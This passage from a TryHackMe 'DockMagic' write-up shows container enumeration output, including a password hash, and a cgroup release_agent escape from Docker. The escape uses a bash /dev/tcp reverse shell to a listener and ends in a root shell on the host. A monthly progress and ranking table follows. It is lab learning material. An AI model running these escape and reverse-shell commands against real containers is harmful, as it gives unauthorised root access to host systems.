[+] Docker Version .......... 24.0.5
[+] CVE–2019–13139 .......... No
[+] CVE–2019–5736 ........... No
==================================( Enumerating Container )===================================
[+] Container ID ............ 23348446b037
[+] Container Full ID ....... 23348446b0372be7e060006578a502495906baa47d34d952a806b07faef76640
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.21.0.2 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.21.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.4.0-139-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7571
[+] Useful tools installed .. Yes
/usr/bin/docker
/usr/bin/curl
/usr/bin/wget
/usr/bin/gcc
/bin/hostname
/usr/bin/python3
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh:	0000000000000000
CapPrm:	00000000a82425fb
CapEff:	00000000a82425fb
CapBnd:	00000000a82425fb
CapAmb:	0000000000000000
> This can be decoded with: "capsh --decode=00000000a82425fb"
[+] SSHD Service ............ Yes (port 22)
[+] Privileged Mode ......... Unknown
[+] Docker API exposed ...... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/var/www/EmpMan/app/app/assets /home/emp/app/assets rw,relatime - ext4 /dev/nvme0n1p3 rw,errors=remount-ro
/var/www/EmpMan/app/db /home/emp/app/db rw,relatime - ext4 /dev/nvme0n1p3 rw,errors=remount-ro
/var/www/EmpMan/app/public /home/emp/app/public rw,relatime - ext4 /dev/nvme0n1p3 rw,errors=remount-ro
/var/www/EmpMan/app/storage /home/emp/app/storage rw,relatime - ext4 /dev/nvme0n1p3 rw,errors=remount-ro
[+] Possible host usernames ... emp 
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxr-xr-x 1 root root 41K Mar 19 15:32 /tmp/deepce.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... total 8.0K
drwxr-xr-x 1 emp emp 4.0K Aug  5  2023 emp
[+] Hashes in shadow file ............... Yes
$y$j9T$HgO9yevCeeQdihmXCLNvF.$lpc60PLJHWIMOrBKPl2YaBuXmcP4tn9v9OCDSramyO/
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

[+] Docker Containers........ 0
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
==============================================================================================
```

```
root@23348446b037:/tmp# ls -lah
total 12K
drwxrwxrwt 1 root root 4.0K Mar 20 20:39 .
drwxr-xr-x 1 root root 4.0K Aug 15  2023 ..
drwxr-xr-x 2 root root 4.0K Aug  5  2023 ImageMagick
dr-xr-xr-x 4 root root    0 Mar 20 19:52 cgrp
root@23348446b037:/tmp# echo 1 > /tmp/cgrp/x/notify_on_release
root@23348446b037:/tmp# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@23348446b037:/tmp# echo "$host_path/cmd" > /tmp/cgrp/release_agent
root@23348446b037:/tmp# echo '#!/bin/bash' > /cmd
>> /cmd348446b037:/tmp# echo "/bin/bash -i >& /dev/tcp/10.65.116.225/6666 0>&1"  
root@23348446b037:/tmp# chmod a+x /cmd
root@23348446b037:/tmp# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

```
:~/DockMagic# nc -nlvp 6666
...
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@dockmagic:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dockmagic:/root# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@dockmagic:/root# export TERM=xterm
export TERM=xterm
root@dockmagic:/root# ^Z
[1]+  Stopped                 nc -nlvp 6666
:~/DockMagic# stty raw -echo; fg
nc -nlvp 6666

root@dockmagic:/root# cd ..
root@dockmagic:/# cd home
root@dockmagic:/home# ls -lah
total 12K
drwxr-xr-x  3 root    root    4.0K Feb 15  2023 .
drwxr-xr-x 19 root    root    4.0K Feb 15  2023 ..
drwxr-xr-x  4 vagrant vagrant 4.0K Aug 15  2023 vagrant
root@dockmagic:/home# cd vagrant
root@dockmagic:/home/vagrant# ls -lah
total 56K
drwxr-xr-x 4 vagrant vagrant 4.0K Aug 15  2023 .
drwxr-xr-x 3 root    root    4.0K Feb 15  2023 ..
-rw------- 1 vagrant vagrant 7.0K Aug 15  2023 .bash_history
-rw-r--r-- 1 vagrant vagrant  220 Feb 15  2023 .bash_logout
-rw-r--r-- 1 vagrant vagrant 3.7K Feb 15  2023 .bashrc
drwxr-xr-x 2 vagrant vagrant 4.0K Feb 15  2023 .cache
-rw-r--r-- 1 vagrant vagrant  807 Feb 15  2023 .profile
drwx------ 2 vagrant vagrant 4.0K Mar 16  2023 .ssh
-rw------- 1 vagrant vagrant  12K Aug 15  2023 .viminfo
-rw-r--r-- 1 vagrant vagrant   13 Feb 15  2023 .vimrc
-rw-r--r-- 1 root    root      38 Mar 16  2023 flag3.txt
root@dockmagic:/home/vagrant# cat flag3.txt
THM{••••••••••••••••••••••••••••••••}
```

<img width="1079" height="651" alt="image" src="https://github.com/user-attachments/assets/1130d337-eefe-4de6-bf7b-d242f8d9be0f" />

<br>
<br>

<p>1.1. What is the value of flag 1?<br>
<code>THM{••••••••••••••••••••••••••••••••}</code></p>

<p>1.2. What is the value of flag 2?<br>
<code>THM{•••••••••••••••••••••••••••••••••}</code></p>

<p>1.3. What is the value of flag 3?<br>
<code>THM{••••••••••••••••••••••••••••••••}</code></p>


<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/df310d62-12e9-407b-9550-bbf9b6aecc94"><br>
                  <img width="900px" src="https://github.com/user-attachments/assets/1292c563-35d1-4529-923c-f9647d5fbc9e"><br>
                  <img width="900px" src="https://github.com/user-attachments/assets/3838536e-0311-4476-9d58-d0ce767f1108"></p>

<h1 align="center">My TryHackMe Journey ・ 2026, March<a id='9'></a></h1>

<div align="center"><h6>

|Day<br><br><br> |Streak<br><br><br>|Room Name<br><br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|League<br><br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|---------------:|
|20<br><br>      |78<br><br>        |DockMagic<br><br>                |Medium<br><br> |🔗<br><br>| 1,155<br><br>| 161,755<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|20<br><br>      |78<br><br>        |Microsoft Intune Monitoring<br>  |Medium<br><br> |🔗<br><br>| 1,154<br><br>| 161,725<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|20<br><br>      |78<br><br>        |SharePoint Online Monitoring<br> |Medium<br><br> |🔗<br><br>| 1,153<br><br>| 161,629<br><br>| 91<br><br>| 14ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|19<br><br>      |77<br><br>        |Detecting AD Post-Exploitation<br>|Hard<br><br>  |🔗<br><br>| 1,152<br><br>| 161,517<br><br>| 91<br><br>| 14ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|19<br><br>      |77<br><br>        |DockMagic - in progress<br><br>  |Medium<br><br> |🚩<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
|18<br><br>      |76<br><br>        |Phishing Unfolding<br><br>       |Medium<br><br> |⚙️<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
|18<br><br>      |76<br><br>        |Introduction to Phishing<br><br> |Easy<br><br>   |⚙️<br><br>| 1,151<br><br>|       -<br><br>|  -<br><br>|    -<br><br>|   -<br><br>|   -<br><br>|   -<br><br>|  -<br><br>|
|18<br><br>      |76<br><br>        |Dev Diaries<br><br>              |Easy<br><br>   |🚩<br><br>| 1,151<br><br>| 161,273<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|17<br><br>      |75<br><br>        |Missing Person<br><br>           |Easy<br><br>   |🚩<br><br>| 1,150<br><br>| 161,123<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|1ˢᵗ<br><br>|
|17<br><br><br>  |75<br><br><br>    |Detecting AD Lateral Movement<br><br>|Medium<br><br><br>|🔗<br><br><br>| 1,149<br><br><br>| 160,883<br><br><br>| 91<br><br><br>| 16ᵗʰ<br><br><br>| 9ᵗʰ<br><br><br>| 2ⁿᵈ<br><br><br>| 1ˢᵗ<br><br><br>|-<br><br><br>|
|12<br><br>      |70<br><br>        |Entra ID Monitoring<br><br>      |Medium<br><br> |🔗<br><br>| 1,147<br><br>| 160,479<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|5ᵗʰ<br><br>|
|12<br><br>      |70<br><br>        |Introduction to Phishing<br>     |Easy<br><br>   |⚙️<br><br>| 1,146<br><br>| 160,343<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|6ᵗʰ<br><br>|
|11<br><br>      |69<br><br>        |Detecting AD Initial Access<br>  |Medium<br><br> |🔗<br><br>| 1,146<br><br>| 160,195<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|4ᵗʰ<br><br>|
|11<br><br>      |69<br><br>        |Minotaur´s Labyrinth<br><br>     |Medium<br><br> |🚩<br><br>| 1,145<br><br>| 160,051<br><br>| 91<br><br>| 16ᵗʰ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|9ᵗʰ<br><br>|
|10<br><br>      |68<br><br>        |Introduction to Phishing<br><br> |Easy<br><br>   |⚙️<br><br>| 1,144<br><br>| 160,021<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|10<br><br>      |68<br><br>        |M365 Monitoring Basics<br><br>   |Medium<br><br> |🔗<br><br>| 1,144<br><br>| 160,016<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|9<br><br>       |67<br><br>        |Advent of Cyber 2022<br><br>     |Easy  <br><br> |🔗<br><br>| 1,143<br><br>| 159,880<br><br>| 91<br><br>| 16ᵗʰ<br><br>| 8ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|8<br><br>       |66<br><br>        |Windows Reversing Intro<br>      |Medium<br><br> |🔗<br><br>| 1,142<br><br>|        <br><br>| 91<br><br>|     <br><br>|    <br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|8<br><br>       |66<br><br>        |Advent of Cyber 2 [2020]<br>     |Easy<br><br>   |🔗<br><br>| 1,141<br><br>| 159,164<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|8<br><br>       |66<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,140<br><br>| 159,068<br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|7<br><br>       |65<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>| 91<br><br>| 20ᵗʰ<br><br>| 7ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|6<br><br>       |64<br><br>        |25 Days of Cyber Security<br>    |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
|6<br><br>       |64<br><br>        |Persistence: T1053<br>           |Easy<br><br>   |🔗<br><br>| 1,139<br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
|5<br><br>       |63<br><br>        |LOVELETTER.EXE<br><br>           |Hard<br><br>   |🚩<br><br>| 1,139<br><br>| 158,294<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|5<br><br>       |63<br><br>        |Monitoring AWS Workloads<br>     |Medium<br><br> |🔗<br><br>| 1,139<br><br>| 157,994<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|5<br><br>       |63<br><br>        |Kernel Blackout<br><br>          |Medium<br><br> |🚩<br><br>| 1,138<br><br>| 157,978<br><br>| 90<br><br>| 20ᵗʰ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|3ʳᵈ<br><br>|
|5<br><br>       |63<br><br>        |Operation Endgame<br><br>        |Hard<br><br>   |🚩<br><br>| 1,137<br><br>| 157,578<br><br>| 90<br><br>| 23ʳᵈ<br><br>| 9ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|7ᵗʰ<br><br>|
|4<br><br>       |62<br><br>        |Monitoring Active Directory<br>  |Medium<br><br> |🔗<br><br>| 1,136<br><br>| 157,396<br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|3<br><br>       |61<br><br>        |Monitoring AWS Services<br>      |Medium<br><br> |🔗<br><br>| 1,135<br><br>|        <br><br>| 90<br><br>| 22ⁿᵈ<br><br>|10ᵗʰ<br><br>| 2ⁿᵈ<br><br>| 1ˢᵗ<br><br>|<br><br>|
|2<br><br>       |60<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|
|1<br><br>       |59<br><br>        |<br><br>                         |      <br><br> |  <br><br>|      <br><br>|        <br><br>|   <br><br>|     <br><br>|    <br><br>|    <br><br>|    <br><br>|<br><br>|

</h6></div><br>

<h1 align="center">My TryHackMe Journey ・ 2026, March</h1>
<p align="center">Global All Time:      14ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/155a865a-fc46-4aa8-b81a-a6f10312429d"><br><br>
                  Global Monthly:        9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2ed8a207-3e47-4c24-9138-30a4aac21b72"><br><br>
                  Brazil All Time:       2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/07108ed7-8f7b-45ff-8d43-59d5fe965a45"><br><br>
                  Brazil Monthly:        1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/cfdf48a7-f46a-407d-b285-dd3ba59ab31e"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
